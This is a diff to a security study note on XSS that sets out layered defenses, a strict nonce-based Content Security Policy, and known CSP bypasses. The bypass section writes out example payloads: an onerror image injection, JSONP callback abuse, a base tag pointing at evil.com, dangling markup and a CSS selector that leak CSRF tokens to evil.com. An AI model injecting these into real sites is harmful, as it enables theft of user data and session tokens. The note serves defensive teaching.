@@ -152,9 +152,11 @@ Every framework provides safe defaults AND an escape hatch for raw HTML. Develop
 
 ## How do you fix XSS?
 
-**Output encoding** — the primary defense. Convert dangerous characters so the browser displays them as text instead of interpreting them as code. `<script>` becomes `&lt;script&gt;` — rendered as visible text, not executed.
+XSS defense is layers. Each layer reduces damage, but only the first two can actually stop the attack.
 
-**Encode on output, not input.** The same data might land in HTML, a JavaScript string, a URL, or CSS. Each context has different dangerous characters. If you HTML-encode on input but later place the data in a JavaScript string, the HTML encoding is meaningless in that context.
+**Layer 1: Prevent the injection (most important).** Output encoding — convert dangerous characters so the browser displays them as text. `<script>` becomes `&lt;script&gt;` — visible text, not executed. This is the only layer that actually prevents XSS. Everything below just limits damage.
+
+**Encode on output, not input.** The same data might land in HTML, a JavaScript string, a URL, or CSS. Each context has different dangerous characters. HTML-encode on input but place the data in a JavaScript string later — the encoding is meaningless in that context.
 
 | Context | Encoding |
 |---|---|
@@ -164,15 +166,72 @@ Every framework provides safe defaults AND an escape hatch for raw HTML. Develop
 | HTML attribute | Attribute encoding |
 | CSS value | CSS escaping |
 
-**CSP (Content Security Policy)** — defense in depth. HTTP header telling the browser: only execute scripts from specific allowed sources.
-
-`Content-Security-Policy: script-src 'self' https://cdn.trusted.com`
-
-Blocks inline scripts (what XSS injects), `eval()`, scripts from untrusted domains. Doesn't prevent the injection — prevents execution. The seatbelt when encoding was missed somewhere.
-
-Common CSP mistakes: `script-src 'unsafe-inline'` (allows all inline scripts, useless), overly broad allowlists, not setting CSP at all.
+Modern frameworks auto-escape by default (React JSX, Angular `{{}}`, Django `{{}}`). You have to deliberately bypass the safety with `dangerouslySetInnerHTML`, `v-html`, `|safe`, `.html_safe`. If you never inject raw HTML, XSS can't happen.
 
 **DOM-based fix** — use safe sinks. `textContent` instead of `innerHTML` (treats everything as plain text). If HTML is needed, sanitize with DOMPurify. Never pass user input to `eval()`, `setTimeout(string)`, `document.write()`.
+
+**Layer 2: CSP with nonce (best second line).** Even if injection happens, the injected script won't have the correct nonce — browser blocks execution.
+
+**Layer 3: HttpOnly cookies.** Even if XSS executes, attacker can't steal the session token via `document.cookie`. But they CAN still act as the user — make API calls, change email/password, phish, keylog — because the browser attaches the HttpOnly cookie automatically on every same-origin request. HttpOnly prevents taking the cookie home; it doesn't prevent using the victim's browser while they're in it.
+
+**Layer 4: Re-authentication for sensitive actions.** Changing password, email, or payment requires the current password. Even during active XSS, the attacker can't perform critical actions without knowing it.
+
+**Layer 5: Short session timeouts.** Limits the window of exploitation even if the attacker acts as the user.
+
+## How does CSP actually work against XSS?
+
+CSP doesn't automatically block inline scripts — it depends entirely on the policy. The spectrum:
+
+| Policy | XSS protection |
+|---|---|
+| `script-src 'nonce-random123'` | Strongest — blocks all scripts except those with the matching nonce |
+| `script-src 'self'` | Good — blocks inline scripts and external scripts from other origins |
+| `script-src 'self' 'unsafe-inline'` | Weak — allows inline scripts, XSS works fine |
+| `frame-ancestors 'self'` (no script-src) | None — only prevents clickjacking, no script restrictions |
+| No CSP at all | None |
+
+`'unsafe-inline'` exists because real websites have inline scripts everywhere — analytics snippets, config variables, event handlers. Banning inline scripts breaks the site. Developers add `'unsafe-inline'` as a shortcut, which destroys CSP's XSS protection. Very common.
+
+A strong, complete CSP:
+
+```
+Content-Security-Policy:
+  default-src 'none';
+  script-src 'nonce-RANDOM_PER_REQUEST';
+  style-src 'nonce-RANDOM_PER_REQUEST';
+  img-src 'self';
+  connect-src 'self' https://your-api.com;
+  frame-ancestors 'none';
+  base-uri 'self';
+  form-action 'self';
+  object-src 'none';
+```
+
+| Directive | What it closes |
+|---|---|
+| `default-src 'none'` | Block everything not explicitly allowed |
+| `script-src 'nonce-...'` | Block all scripts except nonced ones |
+| `style-src 'nonce-...'` | Block CSS injection |
+| `base-uri 'self'` | Block `<base>` tag injection |
+| `form-action 'self'` | Block forms submitting data to attacker |
+| `object-src 'none'` | Block Flash/Java plugins |
+| `frame-ancestors 'none'` | Block clickjacking |
+
+## How can CSP be bypassed?
+
+Even with `script-src 'nonce-...'` or `script-src 'self'`, there are techniques that survive.
+
+**Script gadgets (most realistic bypass).** The attacker doesn't inject a `<script>` tag — they inject HTML that the site's own legitimate JavaScript processes dangerously. The site loads `bundle.js` with a valid nonce. Deep inside, `bundle.js` does `element.innerHTML = someDiv.getAttribute("data-template")`. Attacker injects `<div data-template="<img src=x onerror=alert(1)>">`. CSP allowed `bundle.js` (correct nonce), and `bundle.js` itself created the dangerous HTML. Common in apps using `.innerHTML`, jQuery's `.html()`, or AngularJS template expressions.
+
+**File upload from 'self'.** `script-src 'self'` allows any script served from the same origin. If the app has file upload and serves files from the same domain, the attacker uploads a `.js` file and references it: `<script src="/uploads/avatar.js">`. CSP sees it's from `'self'` and allows it.
+
+**JSONP endpoints on 'self'.** Some APIs on the same origin have JSONP: `/api/data?callback=steal`. Response: `steal({...})`. Attacker injects `<script src="/api/data?callback=steal">`. CSP allows it (from `'self'`), browser executes the response as JavaScript.
+
+**Base tag injection.** Attacker injects `<base href="https://evil.com/">`. Now every relative URL resolves against evil.com. `<script nonce="correct" src="/js/bundle.js">` loads `https://evil.com/js/bundle.js` — nonce is correct, CSP allows it, but the file comes from the attacker. Defense: `base-uri 'self'` in CSP. Most people forget this directive.
+
+**Dangling markup injection (no JavaScript needed).** CSP doesn't help because no script executes. Attacker injects `<img src="https://evil.com/steal?data=` with no closing quote. The browser treats everything after `src="` as part of the URL until it hits the next matching quote — which could be deep in the page HTML, including CSRF tokens and hidden form values. The attacker's server receives page content as part of an image URL request. Only output encoding prevents this.
+
+**CSS injection.** If `style-src` allows inline styles, the attacker injects CSS attribute selectors that leak data character by character: `input[name="csrf_token"][value^="a"] { background: url("https://evil.com/leak?char=a") }`. The browser evaluates the selector, loads the background image, and the attacker's server learns each character. Defense: `style-src 'nonce-...'`.
 
 ## How does XSS chain with other vulnerabilities?
 
@@ -222,8 +281,16 @@ Key mindset: a failed `<script>alert(1)</script>` doesn't mean there's no XSS �
 
 ## Why is XSS so hard to eliminate?
 
-Output encoding has to be correct in every single place user data is rendered. One missed field in a large app — vulnerable. CSP is hard to deploy without breaking functionality (inline scripts, third-party analytics, legacy code). DOM-based XSS keeps growing as apps become more JavaScript-heavy. Context switching between HTML, JavaScript, URLs, and CSS is error-prone. Frameworks help with safe defaults but developers use the escape hatches.
+**Most apps don't have strong CSP.** Deploying nonce-based CSP means finding every inline script across the entire site — analytics snippets, config variables, cookie banners, A/B testing — and either adding nonces or moving them to external files. Coordinate with every third-party vendor. Test everything. For a large site, that's weeks of work. Many teams start, hit too many breakages, and fall back to `'unsafe-inline'` or give up.
 
-XSS has been in the OWASP Top 10 for over 20 years. The defenses exist — applying them consistently across an entire application is the hard part.
+**Auto-escaping frameworks have escape hatches.** React, Angular, Vue, Django, Rails all auto-escape by default. But every one has a way to bypass it (`dangerouslySetInnerHTML`, `v-html`, `|safe`, `.html_safe`, `<%- %>`). These exist for legitimate reasons (rich text editors, markdown rendering). Across a large codebase with many developers over many years, someone eventually uses the escape hatch with untrusted data.
+
+**Context requires different encoding.** The same user input needs HTML encoding in the body, JavaScript escaping in a `<script>` block, URL encoding in an `href`, CSS encoding in a `style`. Six different contexts, six different encoding rules. One wrong context on one page = XSS. Frameworks handle HTML context automatically but often leave JavaScript, URL, and CSS contexts to the developer.
+
+**XSS has hundreds of vectors.** People think XSS means `<script>alert(1)</script>` and filter for `<script>`. But `<img onerror>`, `<svg onload>`, `<details ontoggle>`, `<a href="javascript:">`, event handlers, template literals, encoding tricks — any blocklist approach is incomplete.
+
+**New bypass techniques keep appearing.** Mutation XSS (2019) — sanitizers parse HTML differently than browsers. Prototype pollution → XSS. DOM clobbering — HTML that corrupts how JavaScript reads the DOM. CSP bypasses via trusted CDN libraries. Browser-specific parsing differences. The attack surface evolves faster than defenses.
+
+The asymmetry: for XSS to not exist, every developer must get encoding right in every context on every page, CSP must be strict with no bypasses, no escape hatches used with untrusted data, and all of this must stay true through every code change forever. For XSS to exist, one of these needs to fail once. The defender must be right 100% of the time. The attacker only needs to be right once.
 
 ## My Notes
